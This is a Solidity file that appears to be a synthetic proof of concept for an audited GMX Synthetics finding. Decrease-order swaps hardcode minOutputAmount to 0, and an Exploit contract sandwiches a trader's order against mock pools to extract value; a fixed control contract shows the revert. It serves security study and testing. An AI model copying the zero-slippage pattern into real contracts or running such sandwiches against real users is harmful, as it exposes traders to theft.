// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  GMX Synthetics — H-9 decrease orders ignore user slippage
    (Sherlock 2023-02-gmx, finding 18635).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: swapProfitToCollateralToken and
    swapWithdrawnCollateralToPnlToken pass minOutputAmount = 0 into the
    market swap. DecreaseOrderUtils then pays whatever came back and never
    compares it to the minOutputAmount stored on the order. A searcher can
    move the pool before the keeper fills, and the trader receives less
    than the floor they set. The control forwards that floor into the swap.
    The same sandwiched quote reverts InsufficientOutputAmount.

    Vulnerable lines preserved below (@> VULN). Pools are constant-product
    stand-ins for the audited SwapHandler call, with the 0 literal kept. */

struct DecreaseOrder {
    address receiver;
    uint256 amountIn;
    uint256 minOutputAmount;
    uint8 swapType;
}

contract Erc20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Constant-product market the decrease swap trades against.
contract SpotPool {
    Erc20 public token0;
    Erc20 public token1;
    uint256 public reserve0;
    uint256 public reserve1;

    constructor(Erc20 token0_, Erc20 token1_) {
        token0 = token0_;
        token1 = token1_;
    }

    function seed(uint256 amount0, uint256 amount1) external {
        require(reserve0 == 0 && reserve1 == 0, "seeded");
        token0.mint(address(this), amount0);
        token1.mint(address(this), amount1);
        reserve0 = amount0;
        reserve1 = amount1;
    }

    function quote(address tokenIn, uint256 amountIn) external view returns (uint256) {
        bool in0 = tokenIn == address(token0);
        uint256 rin = in0 ? reserve0 : reserve1;
        uint256 rout = in0 ? reserve1 : reserve0;
        return (rout * amountIn) / (rin + amountIn);
    }

    function swapExactIn(address tokenIn, uint256 amountIn, uint256 minOut, address to)
        external
        returns (uint256 amountOut)
    {
        bool in0 = tokenIn == address(token0);
        require(in0 || tokenIn == address(token1), "token");
        uint256 rin = in0 ? reserve0 : reserve1;
        uint256 rout = in0 ? reserve1 : reserve0;
        Erc20 tin = in0 ? token0 : token1;
        Erc20 tout = in0 ? token1 : token0;
        require(tin.transferFrom(msg.sender, address(this), amountIn), "pull");
        amountOut = (rout * amountIn) / (rin + amountIn);
        require(amountOut >= minOut, "InsufficientOutputAmount");
        require(amountOut < rout, "liq");
        if (in0) {
            reserve0 = rin + amountIn;
            reserve1 = rout - amountOut;
        } else {
            reserve1 = rin + amountIn;
            reserve0 = rout - amountOut;
        }
        require(tout.transfer(to, amountOut), "push");
    }
}

/// Audited decrease collateral swaps. Both floors are hardcoded to 0.
contract DecreaseOrderHandler {
    Erc20 public col;
    Erc20 public pnl;
    SpotPool public poolA;
    SpotPool public poolB;
    uint256 public ignoredMin;
    uint256 public lastPaid;

    constructor(Erc20 col_, Erc20 pnl_, SpotPool poolA_, SpotPool poolB_) {
        col = col_;
        pnl = pnl_;
        poolA = poolA_;
        poolB = poolB_;
        col.approve(address(poolA_), type(uint256).max);
        pnl.approve(address(poolA_), type(uint256).max);
        col.approve(address(poolB_), type(uint256).max);
        pnl.approve(address(poolB_), type(uint256).max);
    }

    function executeDecrease(DecreaseOrder memory order) external returns (uint256 paid) {
        ignoredMin = order.minOutputAmount;
        if (order.swapType == 1) {
            paid = swapProfitToCollateralToken(order.amountIn);
            require(col.transfer(order.receiver, paid), "pay col");
        } else if (order.swapType == 2) {
            paid = swapWithdrawnCollateralToPnlToken(order.amountIn);
            require(pnl.transfer(order.receiver, paid), "pay pnl");
        } else {
            revert("swap type");
        }
        lastPaid = paid;
    }

    // Shape of DecreasePositionCollateralUtils.swapProfitToCollateralToken.
    function swapProfitToCollateralToken(uint256 amountIn) internal returns (uint256 amountOut) {
        // @> VULN: profit-to-collateral decrease swap ignores the user's minOutputAmount
        amountOut = poolA.swapExactIn(address(pnl), amountIn, 0, address(this)); // minOutputAmount
    }

    // Shape of DecreasePositionCollateralUtils.swapWithdrawnCollateralToPnlToken.
    function swapWithdrawnCollateralToPnlToken(uint256 amountIn) internal returns (uint256 amountOut) {
        // @> VULN: collateral-to-pnl decrease swap ignores the user's minOutputAmount
        amountOut = poolB.swapExactIn(address(col), amountIn, 0, address(this)); // minOutputAmount
    }
}

/// Control: the swap receives the order's minOutputAmount, so a worse quote reverts.
contract DecreaseOrderHandlerFixed {
    Erc20 public col;
    Erc20 public pnl;
    SpotPool public poolA;

    constructor(Erc20 col_, Erc20 pnl_, SpotPool poolA_) {
        col = col_;
        pnl = pnl_;
        poolA = poolA_;
        pnl.approve(address(poolA_), type(uint256).max);
    }

    function executeProfitToCollateral(address receiver, uint256 amountIn, uint256 minOutputAmount)
        external
        returns (uint256 paid)
    {
        paid = poolA.swapExactIn(address(pnl), amountIn, minOutputAmount, address(this));
        require(paid >= minOutputAmount, "InsufficientOutputAmount");
        require(col.transfer(receiver, paid), "pay col");
    }
}

contract Exploit {
    address public constant TRADER = 0x2222222222222222222222222222222222222222;
    uint256 public constant RESERVE = 99_000 ether;
    uint256 public constant SEARCHER_IN = 99_000 ether;
    uint256 public constant USER_IN = 1_000 ether;
    uint256 public constant USER_MIN = 900 ether;

    Erc20 public col; // nonce 1
    Erc20 public pnl; // nonce 2
    SpotPool public poolA; // nonce 3
    SpotPool public poolB; // nonce 4
    DecreaseOrderHandler public handler; // nonce 5
    DecreaseOrderHandlerFixed public fixedHandler; // nonce 6

    uint256 public userMin;
    uint256 public fairProfitOut;
    uint256 public profitReceived;
    uint256 public fairCollateralOut;
    uint256 public collateralReceived;
    uint256 public pnlProfit;
    uint256 public colProfit;

    constructor() {
        col = new Erc20("USDC", "USDC");
        pnl = new Erc20("WETH", "WETH");
        poolA = new SpotPool(col, pnl);
        poolB = new SpotPool(col, pnl);
        handler = new DecreaseOrderHandler(col, pnl, poolA, poolB);
        fixedHandler = new DecreaseOrderHandlerFixed(col, pnl, poolA);

        poolA.seed(RESERVE, RESERVE);
        poolB.seed(RESERVE, RESERVE);
        pnl.mint(address(this), SEARCHER_IN);
        col.mint(address(this), SEARCHER_IN);
        pnl.mint(address(handler), USER_IN);
        col.mint(address(handler), USER_IN);
        pnl.mint(address(fixedHandler), USER_IN);

        col.approve(address(poolA), type(uint256).max);
        pnl.approve(address(poolA), type(uint256).max);
        col.approve(address(poolB), type(uint256).max);
        pnl.approve(address(poolB), type(uint256).max);
    }

    function run() external {
        userMin = USER_MIN;
        fairProfitOut = poolA.quote(address(pnl), USER_IN);
        require(fairProfitOut >= userMin, "fair profit quote below min");

        uint256 dumpedCol = poolA.swapExactIn(address(pnl), SEARCHER_IN, 0, address(this));

        DecreaseOrder memory profitOrder = DecreaseOrder({
            receiver: TRADER,
            amountIn: USER_IN,
            minOutputAmount: userMin,
            swapType: 1
        });
        profitReceived = handler.executeDecrease(profitOrder);
        require(profitReceived < userMin, "profit fill respected min");

        poolA.swapExactIn(address(col), dumpedCol, 0, address(this));

        fairCollateralOut = poolB.quote(address(col), USER_IN);
        require(fairCollateralOut >= userMin, "fair collateral quote below min");

        uint256 dumpedPnl = poolB.swapExactIn(address(col), SEARCHER_IN, 0, address(this));

        DecreaseOrder memory collatOrder = DecreaseOrder({
            receiver: TRADER,
            amountIn: USER_IN,
            minOutputAmount: userMin,
            swapType: 2
        });
        collateralReceived = handler.executeDecrease(collatOrder);
        require(collateralReceived < userMin, "collateral fill respected min");

        poolB.swapExactIn(address(pnl), dumpedPnl, 0, address(this));

        require(col.balanceOf(TRADER) == profitReceived, "trader collateral");
        require(pnl.balanceOf(TRADER) == collateralReceived, "trader pnl");
        pnlProfit = pnl.balanceOf(address(this)) - SEARCHER_IN;
        colProfit = col.balanceOf(address(this)) - SEARCHER_IN;
        require(pnlProfit > 0 && colProfit > 0, "searcher extracted nothing");
        require(profitReceived == 248743718592964824120, "profit amount");
        require(collateralReceived == 248743718592964824120, "collateral amount");
        require(pnlProfit == 750629722921914357682, "pnl profit");
        require(colProfit == 750629722921914357682, "col profit");
    }

    function runControl() external {
        poolA.swapExactIn(address(pnl), SEARCHER_IN, 0, address(this));
        uint256 quoted = poolA.quote(address(pnl), USER_IN);
        require(quoted < USER_MIN, "control quote is not worse");
        fixedHandler.executeProfitToCollateral(TRADER, USER_IN, USER_MIN);
    }
}
